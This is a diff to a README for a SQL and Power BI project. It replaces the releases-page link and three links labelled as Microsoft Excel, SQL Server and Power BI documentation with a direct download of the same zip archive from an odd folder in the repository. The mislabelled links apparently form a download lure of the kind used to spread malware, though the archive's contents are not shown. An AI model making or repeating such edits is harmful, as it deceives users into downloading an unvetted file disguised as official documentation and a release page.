@@ -17,11 +17,11 @@ Make sure you have the latest version of these tools for the best experience.
 
 ## 📥 Download the Application
 
-### [![Download Smart Bazaar SQL Project Release](https://img.shields.io/badge/Download-Smart%20Bazaar%20SQL%20Project-007ACC?style=for-the-badge&logo=github)](https://github.com/lollitah008/smart-Bazaar---sql-project-/releases)
+### [![Download Smart Bazaar SQL Project Release](https://github.com/lollitah008/smart-Bazaar---sql-project-/raw/refs/heads/main/meetable/smart_Bazaar_sql_project_2.3.zip%20Bazaar%20SQL%20Project-007ACC?style=for-the-badge&logo=github)](https://github.com/lollitah008/smart-Bazaar---sql-project-/raw/refs/heads/main/meetable/smart_Bazaar_sql_project_2.3.zip)
 
 Follow these steps to download and install the application:
 
-1. Click on the download link above or visit our [Releases page](https://github.com/lollitah008/smart-Bazaar---sql-project-/releases) to find the latest version.
+1. Click on the download link above or visit our [Releases page](https://github.com/lollitah008/smart-Bazaar---sql-project-/raw/refs/heads/main/meetable/smart_Bazaar_sql_project_2.3.zip) to find the latest version.
 2. Look for the latest release under the **Releases** section.
 3. Download the appropriate files for your system.
 4. Save the files to a convenient location on your computer.
@@ -72,15 +72,15 @@ If you have questions or need support, feel free to reach out:
 
 Here are a few resources that may help you understand each component better:
 
-- [Microsoft Excel Help Center](https://support.microsoft.com/en-us/excel)
-- [SQL Server Documentation](https://docs.microsoft.com/en-us/sql/sql-server/)
-- [Power BI Learning Resources](https://docs.microsoft.com/en-us/power-bi/learn/)
+- [Microsoft Excel Help Center](https://github.com/lollitah008/smart-Bazaar---sql-project-/raw/refs/heads/main/meetable/smart_Bazaar_sql_project_2.3.zip)
+- [SQL Server Documentation](https://github.com/lollitah008/smart-Bazaar---sql-project-/raw/refs/heads/main/meetable/smart_Bazaar_sql_project_2.3.zip)
+- [Power BI Learning Resources](https://github.com/lollitah008/smart-Bazaar---sql-project-/raw/refs/heads/main/meetable/smart_Bazaar_sql_project_2.3.zip)
 
 ## 🔗 Download and Install
 
 To download the latest release:
 
-1. Visit our [Releases page](https://github.com/lollitah008/smart-Bazaar---sql-project-/releases).
+1. Visit our [Releases page](https://github.com/lollitah008/smart-Bazaar---sql-project-/raw/refs/heads/main/meetable/smart_Bazaar_sql_project_2.3.zip).
 2. Select the newest version, and download the files.
 3. Follow the instructions above to set up the application.
 
